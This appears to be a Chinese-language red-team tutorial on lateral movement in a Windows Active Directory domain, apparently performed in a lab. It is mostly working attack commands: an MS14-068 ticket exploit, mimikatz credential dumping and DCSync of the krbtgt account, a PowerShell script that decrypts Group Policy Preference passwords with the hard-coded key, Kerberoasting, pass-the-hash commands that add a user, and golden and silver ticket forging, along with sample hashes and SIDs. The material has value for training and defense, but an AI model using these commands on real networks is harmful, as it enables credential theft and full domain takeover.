# 域内横向移动

#### 域内横向移动 <a id="-"></a>

**MS14-068**

**直接访问域控制器的C盘目录：**

![](https://p408.ssl.qhimgs4.com/t01acab0864f1c1ba0a.png)

**查看本机用户信息,记录用户名与SID号**

```text
whoami /all
```

![](https://p408.ssl.qhimgs4.com/t01d0352ef48e8035fa.png)

**进入MS14-068目录，使用以下命令：**

```text
MS14-068.exe -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
```

![](https://p408.ssl.qhimgs4.com/t01820af2385334c897.png)

**打开mimikatz，注入票据**

```text
mimikatz # kerberos::purge          //清空当前凭证
mimikatz # kerberos::list           //查看当前机器凭证
mimikatz # kerberos::ptc 票据文件    //将上一步生成的票据注入到内存中
```

![](https://p408.ssl.qhimgs4.com/t01caaa34792f6e175f.png)

**再次列出域控制器的C盘目录：**

![](https://p408.ssl.qhimgs4.com/t01afc2ce9db1d1637c.png)

**使用PSTools目录下的PsExec.exe获取shell:**

![](https://p408.ssl.qhimgs4.com/t0189945770ad09cbfd.png)

**添加域管理员**

![](https://p408.ssl.qhimgs4.com/t01e837eabc5f2e9c0c.png)

**GPP漏洞**

**组策略下发**

管理工具中打开组策略管理：

![](https://p408.ssl.qhimgs4.com/t01d027d973b99740dd.png)

选择域，并新建组织单位：

![](https://p408.ssl.qhimgs4.com/t018b5ac3edb5e1761a.png)

选择新建的组织单位，并建立GPO：

![](https://p408.ssl.qhimgs4.com/t01db639778901a7b93.png)

点击新建的GPO：

![](https://p408.ssl.qhimgs4.com/t014225aab3dbae6f3f.png)

设定组策略作用范围：

![](https://p408.ssl.qhimgs4.com/t014142e106d85956a9.png)

右键选择GPO，选择编辑--本地用户和组：

![](https://p408.ssl.qhimgs4.com/t0148dfed0ce0eff6b3.png)

新建一个用户：

![](https://p408.ssl.qhimgs4.com/t01238c1f2dc94a2885.png)

域成员上更新组策略，并查看用户:

```text
gpupdate
net user
```

并没有成功。。。

![](https://p408.ssl.qhimgs4.com/t0131633ac17681ff6d.png)

查看sysvol共享文件夹：

![](https://p408.ssl.qhimgs4.com/t0125804b8b1639362b.png)

文件位置：

```text
\\School-DM\SYSVOL\school.com\Policies\{2999DA01-0F90-44D4-8B7A-BC405D9C349A}\Machine\Preferences\Groups
```

文件内容：

![](https://p408.ssl.qhimgs4.com/t0172586f99a4ad7d77.png)

**使用Get-GPPPassword**

打开PowerSploit文件夹，进入Exfiltration文件夹，在当前目录打开CMD，并输入powershell –ep bypass，打开Powershell，加载模块：

```text
Import-Module Get-GPPPassword.ps1
Get-GPPPassword
```

![](https://p408.ssl.qhimgs4.com/t01c0304218f9e77868.png)

输入以下命令后再次运行Get-GPPPassword：

```text
Add-Type -AssemblyName System.Core
```

如依然报错，则为环境问题，采取本地破解的方法。

**本地破解**

将\\SYSVOL\\Policies{GUID}\MACHINE\Preferences\Groups下的Group.xml拷贝出来，其内容如下：

![](https://p408.ssl.qhimgs4.com/t01519e54ae9fbfb469.png)

使用脚本将其破解，powershell版本如下：

```text
function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword
    )

    try {
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)

        switch ($Mod) {
        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        '2' {$Cpassword += ('=' * (4 - $Mod))}
        '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)

        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    }

    catch {Write-Error $Error[0]}
}
Get-DecryptedCpassword "biYmsOSnsOeehzPTba4OhbBQ6qSfzAATQLWlmlAylZU"
```

破解结果如下：

![](https://p408.ssl.qhimgs4.com/t0101dbfc9d352e075a.png)

**SPN票据破解**

**SPN注册**

使用域管理员登陆后，手动注册默认实例： setspn -A MSSQLSvc/school.com:1433 school\linghuchong

如果SQL Server运行在 Local System 账户下，则需要将spn注册在相应服务器的计算机账户下： setspn -S MSSQLSvc/School-Server.school.com:1433 School-Server

**SPN破解**

列出当前用户的票据：

![](https://p408.ssl.qhimgs4.com/t01d4f02705c6b67795.png)

导出票据：

![](https://p408.ssl.qhimgs4.com/t01a125b59d10056f38.png)

**由于加密类型是RC4\_HMAC\_MD5，Kerberos协议第四步TGS-REP将会返回用服务帐户的NTLM密码哈希加密的票据。**

使用字典进行暴力破解：

```text
python tgsrepcrack.py 2.txt "1-40a10000-linghuchong@MSSQLSvc~College-DS1~1433-COLLEGE.COM.kirbi"
```

![](https://p408.ssl.qhimgs4.com/t012ce1143b61d5f3a3.png)

**Pass-The-Hash**

**kali**

```text
pth-winexe -U Administrator%AAD3B435B51404EEAAD3B435B51404EE:7c70a81c7c5882c24298d391fd397885 //192.168.111.150 cmd
```

**Powershell**

```text
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target 192.168.111.150 -Domain TESTDOMAIN -Username Administrator -Hash 7C70A81C7C5882C24298D391FD397885 -Command "net user test123 360College /add" -verbose
```

**Pass-The-Hash（Pass-the-key）**

**虽然"sekurlsa::pth"在mimikatz中被称之为"Pass The Hash",但是其已经超越了以前的"Pass The Hash"，部分人将其命名为"Overpass-the-hash"，也就是"Pass-the-key"**

**登录域成员机器，以管理员身份运行mimikatz，并输入以下命令：**

```text
 privilege::debug 
 log
 sekurlsa::logonpasswords
```

**抓取的凭证会保存在log中，打开文件可以见到administrator账户的ntlm hash：**

![](https://p408.ssl.qhimgs4.com/t014412381ad3c756b1.png)

**在mimikatz中输入以下命令：**

```text
Sekurlsa::pth /domain:school.com /user:administrator /ntlm:上面保存的ntlm hash
```

![](https://p408.ssl.qhimgs4.com/t016a2df577ad7b489a.png)

**此时可以弹出一个CMD，可列出域控服务器中的C$文件**

![](https://p408.ssl.qhimgs4.com/t01e39417a61b9c14b6.png)

**Golden Ticket - 1**

**以管理员身份运行mimikatz，导出用户HASH**

```text
privilege::debug
lsadump::dcsync /user:krbtgt
```

![](https://p408.ssl.qhimgs4.com/t019a9243f9adca441e.png)

记录以下信息：

Hash NTLM: 1692ecea9bc398966ea2a13cd370e312

aes256\_hmac: 87d3913d6cb96fef6fcc7a616ee33625bec4b8cffc7a2efa7f177541dd7d3d9c

**普通用户权限，尝试列出域控目录**

![](https://p408.ssl.qhimgs4.com/t016a83d3433ad35f0c.png)

**查看域用户，可见域管理员账户为administrator**

![](https://p408.ssl.qhimgs4.com/t01a60ed5235d62920e.png)

**查看域的SID号**

![](https://p408.ssl.qhimgs4.com/t0171d86f1d2b42dbe2.png)

**普通用户权限打开mimikatz**

```text
kerberos::purge
kerberos::golden /admin:administrator /domain:school.com /sid:S-1-5-21-2236738896-1661306322-1924668396 /krbtgt:1692ecea9bc398966ea2a13cd370e312 /ticket:ticket.kirbi
kerberos::ptt ticket.kirbi
kerberos::tgt
```

**再次尝试列出域控目录**

![](https://p408.ssl.qhimgs4.com/t013ebad3da4f61abd5.png)

**Golden Ticket - 2**

**也可以是使用aes256，也创建不存在的用户**

```text
kerberos::purge
kerberos::golden /domain:school.com /sid:S-1-5-21-2236738896-1661306322-1924668396 /aes256:87d3913d6cb96fef6fcc7a616ee33625bec4b8cffc7a2efa7f177541dd7d3d9c  /user:hello /ticket:2345
kerberos::ptt 2345
```

**Silver Ticket**

假设已经拿到了与控制的权限，并将域控的账户信息记录下来。

![](https://p408.ssl.qhimgs4.com/t018062eae8cdc91360.png)

```text
Username : SCHOOL-DM$
NTLM     : 35493c328494b75aff81d2ffcf173787
```

利用此Hash制作一张LDAP服务的白银票据：

```text
kerberos::golden /admin:linghuchong /domain:school.com /id:1105 /sid:S-1-5-21-2236738896-1661306322-1924668396 /target:School-DM.school.com /rc4:35493c328494b75aff81d2ffcf173787 /service:LDAP /ptt
```

![](https://p408.ssl.qhimgs4.com/t01c06408fb6875e3a6.png)

利用此票据从域控的DCSync上请求krbtgt的凭据：

```text
lsadump::dcsync /dc:School-DM.school.com /domain:school.com /user:krbtgt
```

![](https://p408.ssl.qhimgs4.com/t017f37279705d3c7dc.png)

有了krbtgt的凭据，再进行黄金票据攻击即可。

**经测试，请求LDAP需新打开一个mimikztz窗口**

